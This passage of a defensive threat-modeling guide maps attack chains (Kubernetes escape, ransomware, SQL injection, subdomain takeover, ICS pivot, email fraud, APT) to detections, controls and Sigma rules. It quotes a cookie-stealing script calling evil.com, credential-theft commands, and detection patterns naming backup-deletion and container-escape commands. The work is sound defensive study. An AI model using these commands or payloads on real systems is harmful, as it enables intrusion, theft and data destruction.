| 5 | Use kubelet credentials or service account token to query API server | kubectl with stolen kubeconfig | T1552.007 (Container API) |
| 6 | Enumerate cluster — list pods, secrets, namespaces, RBAC | kubectl get all, kubectl auth can-i | T1613 (Container and Resource Discovery) |
| 7 | Access Kubernetes Secrets — cloud credentials, database passwords, TLS certs | kubectl get secrets -A -o yaml | T1552.007 |
| 8 | Deploy privileged pod on other nodes (DaemonSet) for cluster-wide access | kubectl apply (malicious DaemonSet) | T1610 (Deploy Container) |
| 9 | Access cloud provider metadata from node — escalate to cloud account | curl to metadata service from node | T1552.005 (Cloud Instance Metadata API) |
| 10 | Establish persistence — mutating webhook, backdoored admission controller | kubectl apply | T1525 (Implant Internal Image) |

### Detection Opportunities

| Step | Detection | Source |
|------|-----------|--------|
| 2 | Reconnaissance tools executing inside container | Container runtime security (Falco, Sysdig) |
| 3 | Escape indicators — nsenter, chroot to /host, write to cgroup release_agent | Falco rules, kernel audit logs |
| 4-5 | Unusual file access to kubelet credentials, API calls from node IP with pod identity | Kubernetes audit logs, Falco |
| 6 | Broad LIST/GET across all namespaces from single service account | K8s audit logs, RBAC anomaly detection |
| 7 | Secret access from non-owner namespace / unexpected service account | K8s audit logs, OPA/Gatekeeper alerts |
| 8 | DaemonSet creation with privileged security context | K8s admission control (OPA), audit logs |
| 9 | Metadata API access from pod network (should use IRSA/Workload Identity instead) | Node-level network monitoring, cloud metadata logs |
| 10 | MutatingWebhookConfiguration created or modified | K8s audit logs, admission controller monitoring |

### Defensive Controls

- **Pod Security Standards** (restricted) — no privileged containers, no hostPID/hostNetwork, drop all capabilities
- **Read-only root filesystem** on containers
- **No Docker socket mounting** — never mount `/var/run/docker.sock` into pods
- **Network Policies** — deny pod-to-node metadata service access (block 169.254.169.254 from pod CIDR)
- **IRSA/Workload Identity** — pods get scoped cloud credentials without node-level metadata access
- **OPA/Gatekeeper** — enforce policies at admission: no privileged pods, no host mounts, image allowlist
- **Falco** — runtime detection of container escape, unexpected process execution, file access
- **RBAC least privilege** — service accounts scoped to namespace, no cluster-admin on workload accounts
- **Secrets management** — use external secrets operator (Vault, AWS Secrets Manager) instead of K8s native secrets
- **Audit logging** — full K8s audit policy capturing all requests

### Critical Step Sigma Rule — Container Escape

```yaml
title: Container Escape via Privileged Operations on Host
id: 9d2e5f6a-7b8c-9d0e-1f2a-3b4c5d6e7f8a
status: experimental
description: Detects indicators of container escape — nsenter to host namespace, cgroup release_agent manipulation, or write to host filesystem mount — activities that should never occur in properly configured container environments.
logsource:
  category: process_creation
  product: linux
detection:
  selection_nsenter:
    CommandLine|contains:
      - 'nsenter'
      - '--mount=/proc/1/ns'
      - '--target 1 --mount'
  selection_cgroup:
    CommandLine|contains:
      - 'release_agent'
      - '/sys/fs/cgroup'
    CommandLine|contains:
      - 'echo'
      - 'sh -c'
  selection_host_mount:
    CommandLine|contains:
      - 'chroot /host'
      - 'mount /dev/'
  condition: selection_nsenter or selection_cgroup or selection_host_mount
falsepositives:
  - Node maintenance operations by cluster admins using nsenter for debugging — should be rare and audited
level: critical
tags:
  - attack.t1611
  - attack.privilege_escalation
```

---

## Scenario 10: Ransomware Kill Chain — Initial Access Through Double Extortion

### Attack Chain

| Step | Action | Tools | ATT&CK ID |
|------|--------|-------|------------|
| 1 | Initial access — exploit internet-facing service (VPN, RDP, Exchange) or via phishing/access broker purchase | Exploit, credentials from dark web | T1190 / T1078 (Exploit Public-Facing App / Valid Accounts) |
| 2 | Establish persistence — web shell, scheduled task, registry run key | Custom backdoor | T1053.005 (Scheduled Task) |
| 3 | Disable/evade security tools — tamper with EDR, disable Windows Defender | GMER, PCHunter, PowerShell | T1562.001 (Impair Defenses: Disable or Modify Tools) |
| 4 | Credential harvesting — LSASS dump, SAM dump, cached credentials | Mimikatz, LaZagne, reg save | T1003 (OS Credential Dumping) |
| 5 | AD enumeration and lateral movement | BloodHound, RDP, PsExec, WMI | T1021 (Remote Services) |
| 6 | Domain admin achieved — full AD control | Pass-the-hash, over-pass-the-hash | T1550.002 (Pass the Hash) |
| 7 | Data exfiltration — stage and exfil sensitive data for double extortion leverage | Rclone to MEGA/cloud storage, WinSCP | T1567.002 (Exfil to Cloud Storage) |
| 8 | Identify and delete/encrypt backups — target Veeam, shadow copies, backup agents | vssadmin, wmic, wbadmin, Veeam cmdlets | T1490 (Inhibit System Recovery) |
| 9 | Deploy ransomware — GPO push, PsExec fan-out, or scheduled task across domain | Custom ransomware binary, GPO deployment | T1486 (Data Encrypted for Impact) |
| 10 | Drop ransom note, establish communication channel (Tor-based leak site) | Ransom note, Tor .onion site | T1491.001 (Defacement: Internal) |

### Detection Opportunities

| Step | Detection | Source |
|------|-----------|--------|
| 1 | Exploitation of public-facing service, credential use from unusual location | IDS/IPS, VPN logs, Azure AD sign-in risk |
| 2 | New scheduled task or registry persistence on server | Sysmon Event 12/13, Event 4698 |
| 3 | EDR tamper events, Defender exclusion additions, service stopped | EDR tamper protection alerts, Event 7036 |
| 4 | LSASS access (see Scenario 2) | Sysmon Event 10 |
| 5 | Lateral movement tooling signatures, unusual RDP sessions | EDR, Event 4624 Type 10, SMB lateral movement |
| 6 | Pass-the-hash — NTLM auth with local admin hash across machines | Event 4624 with LogonType 3, anomalous source |
| 7 | **Rclone execution, large data transfer to cloud storage** | EDR process monitoring, proxy/firewall logs |
| 8 | Shadow copy deletion (`vssadmin delete shadows`), backup agent stopped | Sysmon, Event 7036, Veeam audit logs |
| 9 | Mass file encryption, high I/O, known ransomware signatures, file entropy increase | EDR, file integrity monitoring, canary files |
| 10 | Tor traffic, ransom note file creation | Network monitoring, FIM |

### Defensive Controls

- **Immutable/air-gapped backups** — 3-2-1 rule with offline copy; test restoration quarterly
- **EDR with tamper protection** — agent cannot be disabled without cloud console auth
- **Tiered administration** — Tier 0 (DCs), Tier 1 (servers), Tier 2 (workstations) — no credential overlap
- **LAPS** — unique local admin password per machine, rotated automatically
- **Network segmentation** — limit lateral movement; microsegmentation where feasible
- **GPO lockdown** — restrict who can create/modify GPOs; alert on GPO changes
- **Canary files** — deploy decoy files on shares; alert on any access/modification
- **Rclone/cloud sync tool blocking** — block known exfiltration tools via application control
- **Privileged Access Workstations** — Tier 0 admin from isolated, hardened workstations only
- **Regular tabletop exercises** — ransomware-specific IR plan, tested annually

### Critical Step Sigma Rule — Ransomware Pre-Encryption Indicators

```yaml
title: Shadow Copy Deletion and Backup Disruption Indicating Ransomware Pre-Encryption
id: 0e3f6a7b-8c9d-0e1f-2a3b-4c5d6e7f8a9b
status: experimental
description: Detects deletion of volume shadow copies and disruption of backup services, the final preparatory step before ransomware encryption begins. This is the last reliable detection opportunity before data loss.
logsource:
  category: process_creation
  product: windows
detection:
  selection_vss:
    CommandLine|contains:
      - 'vssadmin delete shadows'
      - 'vssadmin resize shadowstorage'
      - 'wmic shadowcopy delete'
  selection_bcdedit:
    CommandLine|contains:
      - 'bcdedit /set {default} recoveryenabled no'
      - 'bcdedit /set {default} bootstatuspolicy ignoreallfailures'
  selection_wbadmin:
    CommandLine|contains:
      - 'wbadmin delete catalog'
      - 'wbadmin delete systemstatebackup'
  selection_backup_service:
    CommandLine|contains:
      - 'net stop "Veeam'
      - 'sc config VeeamBackupSvc start= disabled'
      - 'net stop SQLWriter'
      - 'taskkill /f /im sqlservr.exe'
  condition: selection_vss or selection_bcdedit or selection_wbadmin or selection_backup_service
falsepositives:
  - System administrators legitimately managing shadow copies during maintenance windows — correlate with change tickets
level: critical
tags:
  - attack.t1490
  - attack.impact
```

---

## Scenario 11: Web App SQLi — File Read — SSH Key — Lateral Movement — Database Exfil

### Attack Chain

| Step | Action | Tools | ATT&CK ID |
|------|--------|-------|------------|
| 1 | Discover SQL injection in search/filter parameter | sqlmap, Burp Suite, manual testing | T1190 (Exploit Public-Facing Application) |
| 2 | Enumerate database — version, databases, tables, users | sqlmap `--dbs`, `--tables` | T1505.001 (SQL Stored Procedures) |
| 3 | Escalate SQLi to file read — `LOAD_FILE()` (MySQL) or `pg_read_file()` (Postgres) | sqlmap `--file-read` | T1005 (Data from Local System) |
| 4 | Read SSH private keys — `/root/.ssh/id_rsa`, `/home/deploy/.ssh/id_rsa` | SQLi file read | T1552.004 (Unsecured Credentials: Private Keys) |
| 5 | Read `/etc/passwd` and `/etc/shadow` (if DB runs as root) to identify users | SQLi file read | T1003.008 (OS Credential Dumping: /etc/passwd and /etc/shadow) |
| 6 | SSH to database server or other internal hosts using stolen key | ssh -i stolen_key user@host | T1021.004 (Remote Services: SSH) |
| 7 | Enumerate internal network from compromised host | nmap, arp -a, netstat | T1046 (Network Service Discovery) |
| 8 | Lateral movement to database servers — find DB creds in app config files | grep, find, manual review | T1552.001 (Credentials In Files) |
| 9 | Connect to production database, dump sensitive tables | pg_dump, mysqldump | T1005 (Data from Local System) |
| 10 | Exfiltrate data via SCP/HTTPS to external server | scp, curl | T1048.002 (Exfiltration Over Alternative Protocol: Asymmetric Encrypted) |

### Detection Opportunities

| Step | Detection | Source |
|------|-----------|--------|
| 1-2 | SQLi patterns in web requests — UNION SELECT, SLEEP(), single-quote errors | WAF, application logs |
| 3 | LOAD_FILE / pg_read_file calls in database query logs | Database audit logging |
| 4 | File access to `.ssh/` directories by database process | auditd, file access monitoring |
| 6 | SSH login from database server IP to internal hosts (unusual source) | SSH auth logs, SIEM correlation |
| 7 | Port scanning activity from compromised host | Network IDS, VPC Flow Logs |
| 9 | pg_dump/mysqldump execution on production database | Database audit logs, process monitoring |
| 10 | Large outbound data transfer from internal server | Netflow, DLP, egress monitoring |

### Defensive Controls

- **Parameterized queries / prepared statements** — eliminates SQLi at the source
- **WAF** with SQLi detection — defense in depth, not primary control
- **Database process runs as non-root user** — cannot read `/root/.ssh/`, `/etc/shadow`
- **Disable `LOAD_FILE()` and `INTO OUTFILE`** — `secure_file_priv` set to empty or restricted directory
- **SSH key management** — passphrase-protected keys, certificate-based SSH auth, no key reuse
- **Network segmentation** — database servers in isolated VLAN, accessible only from app tier
- **Database Activity Monitoring (DAM)** — alert on schema enumeration, bulk SELECT, LOAD_FILE
- **Egress filtering** — internal servers cannot initiate outbound connections to internet; allow only via proxy

### Critical Step Sigma Rule — SQLi File Read

```yaml
title: SQL Injection File Read Function Detected in Web Application
id: 1f4a5b6c-7d8e-9f0a-1b2c-3d4e5f6a7b8c
status: experimental
description: Detects SQL file read functions (LOAD_FILE, pg_read_file, UTL_FILE) in web request parameters or database query logs, indicating exploitation of SQL injection to read arbitrary files from the server.
logsource:
  category: webserver
detection:
  selection_mysql:
    cs-uri-query|contains:
      - 'LOAD_FILE'
      - 'INTO OUTFILE'
      - 'INTO DUMPFILE'
  selection_postgres:
    cs-uri-query|contains:
      - 'pg_read_file'
      - 'pg_read_binary_file'
      - 'pg_ls_dir'
  selection_oracle:
    cs-uri-query|contains:
      - 'UTL_FILE'
      - 'DBMS_JAVA'
  condition: selection_mysql or selection_postgres or selection_oracle
falsepositives:
  - Database admin interfaces that legitimately expose file operations — restrict access by IP
level: critical
tags:
  - attack.t1190
  - attack.t1005
  - attack.initial_access
```

---

## Scenario 12: Subdomain Takeover — Cookie Theft — Session Hijacking — Admin Access

### Attack Chain

| Step | Action | Tools | ATT&CK ID |
|------|--------|-------|------------|
| 1 | Enumerate target subdomains, identify CNAME records pointing to deprovisioned services | subfinder, dnsx, can-i-take-over-xyz | T1595.002 (Active Scanning: Vulnerability Scanning) |
| 2 | Identify dangling CNAME — e.g., `staging.target.com → old-app.herokuapp.com` (deprovisioned) | dig, DNS enumeration | T1584.001 (Compromise Infrastructure: Domains) |
| 3 | Claim the deprovisioned service endpoint (register on Heroku/Azure/S3 with matching name) | Heroku/Azure/S3/GitHub Pages | T1584.001 |
| 4 | Deploy malicious content on claimed subdomain | Custom HTML/JS | T1189 (Drive-by Compromise) |
| 5 | Subdomain shares parent domain cookie scope — if cookies set on `.target.com`, attacker can read them | JavaScript `document.cookie` | T1539 (Steal Web Session Cookie) |
| 6 | Inject JS that exfiltrates session cookies to attacker server | `<script>fetch('https://evil.com/log?c='+document.cookie)</script>` | T1185 (Browser Session Hijacking) |
| 7 | Lure victims to subdomain (watering hole, link in phishing email) or wait for cached DNS | Social engineering, SEO poisoning | T1566.002 (Spearphishing Link) |
| 8 | Import stolen session cookies, access main application as victim | Browser cookie editor | T1550.004 (Web Session Cookie) |
| 9 | If victim is admin — access admin panel, modify configurations, exfiltrate data | Application functionality | T1078 (Valid Accounts) |

### Detection Opportunities

| Step | Detection | Source |
|------|-----------|--------|
| 1-2 | Dangling DNS records identified by periodic scanning | DNS monitoring tools, automated subdomain audit |
| 3 | Subdomain resolving to non-corporate infrastructure | DNS monitoring, external attack surface management |
| 5-6 | JavaScript making cross-origin requests from corporate subdomain | CSP violation reports, SRI monitoring |
| 7 | Traffic to previously dormant subdomain | Web analytics, DNS query monitoring |
| 8 | Session used from different IP/User-Agent than original authentication | Session anomaly detection, WAF |
| 9 | Admin actions from unusual IP or without fresh authentication | Application audit logs, privileged action monitoring |

### Defensive Controls

- **DNS hygiene** — automated monitoring for dangling CNAMEs; remove DNS records when deprovisioning services
- **Cookie security** — `__Host-` prefix (prevents subdomain scope), `Secure`, `HttpOnly`, `SameSite=Strict`
- **Domain-scoped cookies** — set cookies on specific FQDN (`app.target.com`) not parent domain (`.target.com`)
- **Content Security Policy (CSP)** — restrict script sources, prevent inline script execution
- **External attack surface management (EASM)** — continuous monitoring for subdomain takeover vulnerabilities
- **Session binding** — bind sessions to client fingerprint (IP + User-Agent + TLS fingerprint)
- **Re-authentication for sensitive actions** — admin functions require fresh MFA regardless of session

### Critical Step Sigma Rule — Dangling CNAME Detection

```yaml
title: Subdomain Resolving to Unclaimed Third-Party Service
id: 2a5b6c7d-8e9f-0a1b-2c3d-4e5f6a7b8c9d
status: experimental
description: Detects DNS resolution of corporate subdomains to known third-party hosting services that return error pages or default content, indicating potential subdomain takeover vulnerability.
logsource:
  category: dns_query
detection:
  selection_cname:
    answer|contains:
      - '.herokuapp.com'
      - '.azurewebsites.net'
      - '.cloudfront.net'
      - '.s3.amazonaws.com'
      - '.github.io'
      - '.ghost.io'
      - '.pantheonsite.io'
      - '.shopify.com'
      - '.zendesk.com'
  selection_corporate:
    query|endswith:
      - '.target.com'
      - '.target.io'
  filter_known:
    answer|contains:
      - 'known-service-1.herokuapp.com'
      - 'known-app.azurewebsites.net'
  condition: selection_cname and selection_corporate and not filter_known
falsepositives:
  - Legitimate corporate services hosted on these platforms — maintain allowlist of known service endpoints
level: medium
tags:
  - attack.t1584.001
  - attack.resource_development
```

**Note**: This detection is best implemented as a scheduled scan rather than real-time rule — run daily DNS resolution check against all known subdomains.

---

## Scenario 13: IoT Device Compromise — Network Pivot — SCADA/ICS Access

### Attack Chain

| Step | Action | Tools | ATT&CK ID |
|------|--------|-------|------------|
| 1 | Scan for exposed IoT devices — IP cameras, printers, building management systems | Shodan, Censys, nmap | T1595.001 (Active Scanning: Scanning IP Blocks) |
| 2 | Exploit default credentials or known firmware vulnerability | Hydra, Metasploit, public exploits | T1190 / T1078.001 (Default Accounts) |
| 3 | Gain shell on IoT device — typically Linux-based, ARM architecture | Custom payload, BusyBox exploitation | T1059.004 (Unix Shell) |
| 4 | Enumerate network from IoT device — discover flat network with OT systems | nmap (cross-compiled), arp scan | T1046 (Network Service Discovery) |
| 5 | IoT device is on same VLAN or can route to OT/ICS network (common misconfig) | Network routing, VLAN hopping | T1599 (Network Boundary Bridging) |
| 6 | Identify SCADA/ICS systems — Modbus (502), DNP3 (20000), EtherNet/IP (44818) | nmap with ICS scripts, plcscan | T1046 |
| 7 | Interact with PLCs — read/write registers, modify setpoints | pymodbus, Metasploit ICS modules, custom scripts | T0855 (Unauthorized Command Message) [ICS ATT&CK] |
| 8 | Manipulate physical process — change temperature setpoints, disable safety interlocks | PLC register writes | T0836 (Modify Parameter) [ICS ATT&CK] |
| 9 | Establish persistence on IoT device — cron job, modified firmware | Custom implant | T1542.004 (Pre-OS Boot: ROMMONkit) |

### Detection Opportunities

| Step | Detection | Source |
|------|-----------|--------|
| 1 | External scanning of IoT management interfaces | Firewall logs, IDS |
| 2 | Brute force attempts against IoT devices, default credential use | Device logs (limited), network IDS |
| 3 | Unusual outbound connection from IoT device | Network monitoring, NAC |
| 4 | Port scanning activity from IoT device VLAN | Network IDS, switch port monitoring |
| 5-6 | Traffic from IT/IoT network to OT network (crossing segmentation boundary) | Industrial firewall, network TAP |
| 7 | Modbus/DNP3 write commands from non-HMI/engineering workstation source IP | ICS protocol-aware IDS (Claroty, Nozomi, Dragos) |
| 8 | Process variable deviation from expected range | Historian data, safety instrumented system (SIS) |
| 9 | Firmware modification, unexpected cron entries on IoT device | IoT device management platform, FIM |

### Defensive Controls

- **Network segmentation** — Purdue Model enforcement; IoT in separate zone from OT; firewall between IT/OT
- **IoT device hardening** — change default credentials, disable unnecessary services, regular firmware updates
- **NAC (Network Access Control)** — IoT devices profiled and restricted to necessary communication only
- **ICS protocol monitoring** — deploy ICS-aware IDS (Dragos Platform, Claroty, Nozomi) on OT network
- **Unidirectional gateways** (data diodes) — OT data flows out to IT for monitoring; no inbound path
- **Safety Instrumented Systems (SIS)** — independent from control system; hardwired safety interlocks cannot be overridden via network
- **Asset inventory** — complete inventory of all IoT/OT devices with firmware versions; continuous discovery
- **Vulnerability management** — patch IoT devices or apply compensating controls (virtual patching via IPS)

### Critical Step Sigma Rule — Unauthorized ICS Protocol Communication

```yaml
title: Modbus Write Command from Non-Authorized Source
id: 3b6c7d8e-9f0a-1b2c-3d4e-5f6a7b8c9d0e
status: experimental
description: Detects Modbus write function codes (5, 6, 15, 16) originating from IP addresses not in the authorized HMI/engineering workstation list, indicating unauthorized manipulation of ICS/SCADA systems.
logsource:
  category: network_connection
  product: zeek
detection:
  selection_modbus:
    dst_port: 502
    modbus.function_code:
      - 5   # Write Single Coil
      - 6   # Write Single Register
      - 15  # Write Multiple Coils
      - 16  # Write Multiple Registers
  filter_authorized:
    src_ip:
      - '10.20.1.10'  # HMI-1
      - '10.20.1.11'  # HMI-2
      - '10.20.1.50'  # Engineering WS
  condition: selection_modbus and not filter_authorized
falsepositives:
  - New engineering workstations not yet added to allowlist — maintain strict IP inventory
level: critical
tags:
  - attack.t0855
  - attack.t0836
  - ics-attack.execution
```

---

## Scenario 14: BEC — Invoice Fraud — Financial Theft — Money Laundering

### Attack Chain

| Step | Action | Tools | ATT&CK ID |
|------|--------|-------|------------|
| 1 | Compromise executive email via phishing or credential stuffing | Phishing kit, credential lists | T1586.002 (Compromise Accounts: Email Accounts) |
| 2 | Set up email rules — forward specific emails (invoices, payments) to external account, delete alerts | OWA rules, Outlook rules | T1114.003 (Email Collection: Email Forwarding Rule) |
| 3 | Monitor email for upcoming payment, vendor relationships, approval chains | Email access | T1114.002 (Remote Email Collection) |
| 4 | Register lookalike domain for vendor (e.g., `supp1ier.com` vs `supplier.com`) | Domain registrar | T1583.001 (Acquire Infrastructure: Domains) |
| 5 | Send fraudulent invoice from compromised exec or spoofed vendor email with modified bank details | Compromised email or lookalike domain | T1534 (Internal Spearphishing) |
| 6 | Accounts payable processes payment to attacker-controlled bank account | Wire transfer | T1657 (Financial Theft) |
| 7 | Funds moved through layering accounts — multiple transfers across jurisdictions | Mule accounts, cryptocurrency exchange | N/A (financial crime) |
| 8 | Convert to cryptocurrency or withdraw through money mules | Cryptocurrency exchanges, cash withdrawal | N/A |

### Detection Opportunities

| Step | Detection | Source |
|------|-----------|--------|
| 1 | Compromised account — login from unusual location, device, or time | Azure AD sign-in logs, Impossible Travel |
| 2 | **New mailbox rules** — especially forwarding to external addresses or rules that delete items | Exchange audit logs, Defender for O365 |
| 3 | Unusual email access patterns — reading emails in bulk, accessing invoices outside normal workflow | CASB, email audit logs, UEBA |
| 4 | Lookalike domain registered matching vendor name | Domain monitoring, DMARC aggregate reports |
| 5 | Email from external domain that closely mimics known vendor | Email gateway — homograph detection, display name spoofing detection |
| 6 | Payment to new bank account, change in vendor payment details | ERP/finance system audit logs, AP workflow alerts |

### Defensive Controls

- **Phishing-resistant MFA** (FIDO2) — prevents initial email compromise
- **Mail flow rules** — alert on new forwarding rules to external domains, block auto-forward to external
- **DMARC enforcement (p=reject)** — prevents domain spoofing; SPF + DKIM + DMARC on all corporate domains
- **Vendor payment verification** — out-of-band confirmation (phone call to known number) for any bank detail change
- **Dual authorization** for wire transfers above threshold — two-person approval from different devices
- **Lookalike domain monitoring** — DNSTwist, PhishCatcher for visual similarity detection
- **Finance team training** — specific BEC scenarios in security awareness; no urgency-based payment approval
- **Payment system controls** — ERP flags when vendor bank details change, mandatory cooling period for new payment details
- **Email banner** — "This email originated from outside the organization" warning on all external emails

### Critical Step Sigma Rule — Suspicious Mail Forwarding Rule

```yaml
title: Exchange Mailbox Forwarding Rule to External Address Created
id: 4c7d8e9f-0a1b-2c3d-4e5f-6a7b8c9d0e1f
status: experimental
description: Detects creation of mailbox rules that forward or redirect email to external addresses, a key persistence and collection mechanism in Business Email Compromise attacks.
logsource:
  product: microsoft365
  service: exchange
detection:
  selection_operation:
    Operation:
      - 'New-InboxRule'
      - 'Set-InboxRule'
      - 'Set-Mailbox'
  selection_forward:
    Parameters|contains:
      - 'ForwardTo'
      - 'ForwardAsAttachmentTo'
      - 'RedirectTo'
      - 'DeliverToMailboxAndForward'
  filter_internal:
    Parameters|contains: '@target.com'
  condition: selection_operation and selection_forward and not filter_internal
falsepositives:
  - Legitimate forwarding rules for shared mailboxes or distribution lists — maintain approved forwarding list
level: high
tags:
  - attack.t1114.003
  - attack.collection
  - attack.persistence
```

---

## Scenario 15: Zero-Day Exploitation — Persistence — Long-Term APT Campaign

### Attack Chain

| Step | Action | Tools | ATT&CK ID |
|------|--------|-------|------------|
| 1 | Target selection — intelligence requirement drives target; extensive OSINT on organization | Custom OSINT tooling, HUMINT | T1591 (Gather Victim Org Information) |
| 2 | Zero-day exploitation of internet-facing service (e.g., Exchange, Confluence, edge device) | Custom exploit (0-day) | T1190 (Exploit Public-Facing Application) |
| 3 | Deploy memory-resident implant — no files dropped to disk | Custom shellcode, reflective DLL injection | T1055.001 (Process Injection: DLL Injection) |
| 4 | Establish covert C2 — DNS over HTTPS, steganography in images, or traffic blended with legitimate CDN | Custom C2 framework, domain fronting | T1071.004 (Application Layer Protocol: DNS), T1090.004 (Proxy: Domain Fronting) |
| 5 | Persistence across reboots — firmware implant, WMI event subscription, or compromised trusted binary | Custom firmware backdoor, SDB shim | T1546.007 (Event Triggered Execution: WMI Subscription), T1542 (Pre-OS Boot) |
| 6 | Slow, methodical credential harvesting — DCSync only for targeted accounts, not mass dumping | Custom credential stealer, selective DCSync | T1003.006 (DCSync) |
| 7 | Lateral movement via legitimate tools only — RDP, WinRM, PsExec with valid credentials | Built-in Windows tools | T1021 (Remote Services) |
| 8 | Identify high-value data stores — R&D file shares, email servers, database servers | File share enumeration, internal wiki access | T1213 (Data from Information Repositories) |
| 9 | Slow data exfiltration — small volumes over extended period, encrypted, during business hours | Custom exfil tool, encrypted HTTPS to legitimate-looking infrastructure | T1048.001 (Exfil Over Encrypted Protocol) |
| 10 | Maintain access for months/years — rotate infrastructure, update implants, avoid detection | Custom C2 management | T1583.003 (Acquire Infrastructure: Virtual Private Server) |
| 11 | Anti-forensics — timestomping, log manipulation, counter-incident-response | Custom tools | T1070.006 (Timestomp), T1070.001 (Clear Windows Event Logs) |

### Detection Opportunities

| Step | Detection | Source |
|------|-----------|--------|
| 2 | Exploitation artifacts — unusual process spawns from service, crash dumps | EDR, application logs, crash dump analysis |
| 3 | Memory-only implant — anomalous thread injection, unbacked executable memory regions | EDR memory scanning, ETW (Event Tracing for Windows) |
| 4 | DNS over HTTPS to non-corporate resolvers, domain fronting detection | TLS inspection, DNS over HTTPS proxy enforcement, JA3 fingerprinting |
| 5 | WMI subscriptions in unusual namespace, firmware integrity check failures | Sysmon Event 19/20/21, Secure Boot attestation, TPM measurements |
| 6 | Selective DCSync — replication request from non-DC for specific accounts | Event 4662, SACL on sensitive objects |
| 7 | Lateral movement during off-hours, from unexpected source machines | UEBA, logon event correlation |
| 8 | Unusual file share access patterns — first access to R&D shares by account | File audit logs, UEBA |
| 9 | Slow exfil — consistent small outbound transfers to same destination | Network baseline anomaly detection, long-term traffic analysis |
| 10 | Infrastructure rotation — new C2 domains with similar TLS cert patterns | Threat intelligence, certificate transparency monitoring |
| 11 | Timestomping detection — $MFN/$SI timestamp mismatch, gap in log sequence | NTFS forensic analysis, log completeness monitoring |

### Defensive Controls

- **Assume breach posture** — defense in depth assuming perimeter will be bypassed
- **Zero Trust Architecture** — verify every request regardless of network location; microsegmentation
- **Firmware integrity** — Secure Boot, measured boot with TPM attestation, Intel Boot Guard
- **Memory protection** — Credential Guard, Hypervisor-Protected Code Integrity (HVCI), exploit protection (ASLR, DEP, CFG)
- **Network detection** — full TLS inspection at egress, DNS over HTTPS forced through corporate proxy
- **Threat hunting program** — proactive hypothesis-driven hunts; don't rely solely on alerting
- **Deception technology** — canary tokens, honeypots, honey credentials — detect post-exploitation activity
- **Log integrity** — forward logs immediately to immutable SIEM; tamper-evident logging (log signing)
- **Behavioral analytics (UEBA)** — detect anomalies that signature-based detection misses
- **SACL auditing** on high-value AD objects — alert on any access to sensitive accounts/groups
- **Purple team exercises** — regularly test detection coverage against known APT TTPs
- **Incident response retainer** — pre-negotiated DFIR support for rapid response

### Critical Step Sigma Rule — Memory-Resident Implant Indicators

```yaml
title: Suspicious Process Injection with Unbacked Executable Memory
id: 5d8e9f0a-1b2c-3d4e-5f6a-7b8c9d0e1f2a
status: experimental
description: Detects process injection indicators consistent with fileless/memory-resident implants — a legitimate process allocating executable memory and creating remote threads, commonly used by sophisticated threat actors to avoid disk-based detection.
logsource:
  category: process_access
  product: windows
detection:
  selection_injection:
    GrantedAccess|contains:
      - '0x1fffff'
      - '0x801'
      - '0x40'
    CallTrace|contains:
      - 'ntdll.dll'
      - 'UNKNOWN'
  selection_target:
    TargetImage|endswith:
      - '\svchost.exe'
      - '\explorer.exe'
      - '\lsass.exe'
      - '\RuntimeBroker.exe'
      - '\dllhost.exe'
  filter_legitimate:
    SourceImage|startswith:
      - 'C:\Windows\system32\'
      - 'C:\Program Files\Windows Defender\'
  condition: selection_injection and selection_target and not filter_legitimate
falsepositives:
  - Some legitimate software (accessibility tools, screen readers) injects into system processes — validate and allowlist specific source images
level: high
tags:
  - attack.t1055.001
  - attack.defense_evasion
  - attack.privilege_escalation
```

---

## Cross-Scenario Defensive Priority Matrix

The following controls appear across multiple scenarios and represent the highest-value defensive investments:

| Control | Scenarios Mitigated | Priority |
|---------|-------------------|----------|
| **Phishing-resistant MFA (FIDO2/Passkeys)** | 2, 4, 5, 10, 14 | Critical |
| **Network segmentation / microsegmentation** | 7, 8, 9, 10, 11, 13 | Critical |
| **EDR with tamper protection** | 2, 3, 10, 15 | Critical |
| **Immutable/air-gapped backups** | 10 | Critical |
| **Least-privilege IAM / RBAC** | 1, 6, 9 | Critical |
| **Tiered administration model** | 2, 7, 10 | High |
| **DLP and egress monitoring** | 4, 8, 11 | High |
| **Cloud security posture (CSPM)** | 1, 3, 6, 9 | High |
| **DNS inspection and filtering** | 8, 15 | High |
| **UEBA / behavioral analytics** | 8, 14, 15 | High |
| **Vulnerability management (edge devices)** | 7, 10, 13 | High |
| **Supply chain security (SLSA, signed artifacts)** | 3 | High |
| **Deception technology (canary tokens, honeypots)** | 2, 7, 15 | Medium |
| **Threat hunting program** | 15 | Medium |

---

## Detection Coverage Heatmap

Map each scenario to MITRE ATT&CK tactics to identify coverage gaps:

| Tactic | Scenarios with Coverage | Common Gap |
|--------|------------------------|------------|
| Initial Access | 1-15 (all) | Zero-day (15) is hardest to detect at entry |
| Execution | 2, 3, 9, 10 | Fileless/memory-only execution evades basic AV |
| Persistence | 2, 3, 5, 9, 10, 15 | Firmware-level and cloud-native persistence under-monitored |
| Privilege Escalation | 1, 6, 7, 9 | Cloud IAM escalation paths poorly understood |
| Defense Evasion | 10, 15 | EDR bypass and log tampering remain effective |
| Credential Access | 2, 4, 5, 7, 11 | AiTM phishing bypasses traditional MFA |
| Discovery | All | Hard to distinguish from legitimate admin activity |
| Lateral Movement | 2, 7, 10, 11, 13 | "Living off the land" indistinguishable from admin ops |
| Collection | 4, 8, 14, 15 | Slow collection over time defeats threshold-based alerts |
| Exfiltration | 1, 3, 4, 8, 11, 15 | Encrypted exfil over HTTPS blends with normal traffic |
| Impact | 10, 13 | Ransomware and ICS manipulation — detection must be pre-impact |
